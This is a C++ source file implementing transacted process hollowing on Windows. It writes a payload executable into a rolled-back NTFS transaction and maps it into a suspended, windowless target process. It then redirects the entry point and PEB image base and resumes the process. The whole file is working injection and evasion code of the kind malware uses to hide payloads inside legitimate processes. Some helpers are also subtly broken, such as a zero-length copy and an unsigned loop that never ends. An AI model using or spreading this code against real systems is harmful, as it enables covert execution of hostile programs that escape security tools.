#include "hollowing.h"

HANDLE hollowing::makeTransactedSection(PWCHAR dummyName, PBYTE payladBuf, DWORD payloadSize) {
    DWORD options, isolationLvl, isolationFlags, timeout;
    options = isolationLvl = isolationFlags = timeout = 0;

    HANDLE hTransaction = CreateTransaction(nullptr, nullptr, options, isolationLvl, isolationFlags, timeout, nullptr);

    if (hTransaction == INVALID_HANDLE_VALUE) {
        return INVALID_HANDLE_VALUE;
    }
    HANDLE hTransactedFile = CreateFileTransactedW(dummyName,
        GENERIC_WRITE | GENERIC_READ,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        hTransaction,
        NULL,
        NULL
    );
    if (hTransactedFile == INVALID_HANDLE_VALUE) {;
        return INVALID_HANDLE_VALUE;
    }

    DWORD writtenLen = 0;
    if (!WriteFile(hTransactedFile, payladBuf, payloadSize, &writtenLen, NULL)) {;
        return INVALID_HANDLE_VALUE;
    }

    HANDLE hSection = nullptr;
    NTSTATUS status = NtCreateSection(&hSection,
        SECTION_ALL_ACCESS,
        NULL,
        0,
        PAGE_READONLY,
        SEC_IMAGE,
        hTransactedFile
    );
    if (status != STATUS_SUCCESS) {
        return INVALID_HANDLE_VALUE;
    }
    CloseHandle(hTransactedFile);
    hTransactedFile = nullptr;

    if (RollbackTransaction(hTransaction) == FALSE) {
        return INVALID_HANDLE_VALUE;
    }
    CloseHandle(hTransaction);
    hTransaction = nullptr;

    return hSection;
}


typeCreateProcessInternalW CreateProcessInternalW = (typeCreateProcessInternalW)GetProcAddress(GetModuleHandleA("kernel32"), "CreateProcessInternalW");
bool hollowing::createNewProcessInternal(PROCESS_INFORMATION& pi, const wchar_t* cmdLine, LPWSTR startDir) {
    STARTUPINFOW si = { 0 };
    si.cb = sizeof(STARTUPINFOW);

    memset(&pi, 0, sizeof(PROCESS_INFORMATION));

    HANDLE hToken = NULL;
    HANDLE hNewToken = NULL;

    if (!CreateProcessInternalW(hToken,
        NULL,
        (LPWSTR)cmdLine,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW,
        NULL,
        startDir,
        &si,
        &pi,
        &hNewToken
    ))
    {
        return false;
    }
    return true;
}

PVOID hollowing::mapBufferIntoProcess(HANDLE hProcess, HANDLE hSection)
{
    NTSTATUS status = STATUS_SUCCESS;
    SIZE_T viewSize = 0;
    PVOID sectionBaseAddress = 0;

    if ((status = NtMapViewOfSection(hSection, hProcess, &sectionBaseAddress, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_READONLY)) != STATUS_SUCCESS)
    {
        if (status == STATUS_IMAGE_NOT_AT_BASE) {
     
        }
        else {
            return NULL;
        }
    }
    return sectionBaseAddress;
}

PBYTE hollowing::getPayloadBuffer(const wchar_t* filename, SIZE_T& payloadSize) {

     HANDLE file = CreateFileW(filename, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
     HANDLE mapping = CreateFileMapping(file, 0, PAGE_READONLY, 0, 0, 0);
     if (!mapping) {
          CloseHandle(file);
          return nullptr;
     }

     BYTE* dllRawData = (BYTE*)MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, 0);

     if (dllRawData == nullptr) {
         CloseHandle(mapping);
         CloseHandle(file);
         return nullptr;
     }

     payloadSize = GetFileSize(file, 0);
     PBYTE localCopyAddress = (PBYTE)VirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

     if (localCopyAddress == NULL) {
         return nullptr;
     }
     memcpy(localCopyAddress, dllRawData, payloadSize);
     UnmapViewOfFile(dllRawData);

     CloseHandle(mapping);
     CloseHandle(file);

     return localCopyAddress;
}

BOOL hollowing::updateRemoteEp(PROCESS_INFORMATION& pi, ULONGLONG epVa) {
    
     CONTEXT context = { 0 };
     memset(&context, 0, sizeof(CONTEXT));
     context.ContextFlags = CONTEXT_INTEGER;

     if (!GetThreadContext(pi.hThread, &context)) {
         return FALSE;
     }

     context.Rcx = epVa;

     return SetThreadContext(pi.hThread, &context);
}

ULONGLONG hollowing::getRemotePebAddress(PROCESS_INFORMATION& pi)
{
    ULONGLONG pebAddr = 0;
    CONTEXT context;
    memset(&context, 0, sizeof(CONTEXT));
    context.ContextFlags = CONTEXT_INTEGER;
    if (!GetThreadContext(pi.hThread, &context)) {
        return 0;
    }
    
    pebAddr = context.Rdx;

    return pebAddr;
}


DWORD hollowing::getEpRva(PBYTE peBuffer) {
    PIMAGE_DOS_HEADER payloadDosHdr = (PIMAGE_DOS_HEADER)(peBuffer);
    PIMAGE_NT_HEADERS payloadNtHdrs = (PIMAGE_NT_HEADERS)(peBuffer + payloadDosHdr->e_lfanew);

    return payloadNtHdrs->OptionalHeader.AddressOfEntryPoint;
}

bool hollowing::redirectEp(PBYTE loadedPe, PVOID loadBase, PROCESS_INFORMATION& pi)
{
    DWORD ep = getEpRva(loadedPe);
    ULONGLONG epVa = (ULONGLONG)loadBase + ep;

    if (updateRemoteEp(pi, epVa) == FALSE) {
        return false;
    }
    return true;
}

bool hollowing::setNewImageBase(PBYTE loadedPe, PVOID loadBase, PROCESS_INFORMATION& pi)
{
    ULONGLONG remotePebAddr = getRemotePebAddress(pi);
    if (!remotePebAddr) {
        return false;
    }

    LPVOID remoteImgBase = (LPVOID)(remotePebAddr + (sizeof(ULONGLONG) * 2));
    const size_t imgBaseSize = sizeof(ULONGLONG);

    SIZE_T written = 0;
    if (!WriteProcessMemory(pi.hProcess, remoteImgBase,
        &loadBase, imgBaseSize,
        &written))
    {
        return false;
    }
    return true;
}
bool hollowing::redirectToPayload(PBYTE loadedPe, PVOID loadBase, PROCESS_INFORMATION& pi)
{
    if (!redirectEp(loadedPe, loadBase, pi)) return false;
    if (!setNewImageBase(loadedPe, loadBase, pi)) return false;

    return true;
}

wchar_t* getFileName(wchar_t* fullPath)
{
    size_t len = wcslen(fullPath);
    for (size_t i = len - 2; i >= 0; i--) {
        if (fullPath[i] == '\\' || fullPath[i] == '/') {
            return fullPath + (i + 1);
        }
    }
    return fullPath;
}

wchar_t* getDirectory(const wchar_t* fullPath, wchar_t* outBuf, const size_t outBufSize)
{
    memset(outBuf, 0, outBufSize);
    memcpy(outBuf, fullPath, outBufSize);

    wchar_t* namePtr = getFileName(outBuf);
    if (namePtr != nullptr) {
        *namePtr = '\0';
    }
    return outBuf;
}

bool hollowing::hollow(const wchar_t* targetPath, PBYTE payladBuf, DWORD payloadSize)
{
    wchar_t dummyName[MAX_PATH] = { 0 };
    wchar_t tempPath[MAX_PATH] = { 0 };
    DWORD size = GetTempPathW(MAX_PATH, tempPath);
    GetTempFileNameW(tempPath, L"TH", 0, dummyName);

    HANDLE hSection = makeTransactedSection(dummyName, payladBuf, payloadSize);

    if (!hSection || hSection == INVALID_HANDLE_VALUE) {
        return false;
    }
    wchar_t* startDir = NULL;
    wchar_t dirPath[MAX_PATH] = { 0 };
    getDirectory(targetPath, dirPath, NULL);

    if (wcsnlen(dirPath, MAX_PATH) > 0) {
        startDir = dirPath;
    }
    PROCESS_INFORMATION pi = { 0 };

    if (!createNewProcessInternal(pi, targetPath, startDir)) {
        return false;
    }
    HANDLE hProcess = pi.hProcess;
    PVOID remote_base = mapBufferIntoProcess(hProcess, hSection);

    if (!remote_base) {
        return false;
    }
  
    if (!redirectToPayload(payladBuf, remote_base, pi)) {
        return false;
    }

    ResumeThread(pi.hThread);
    return true;
}
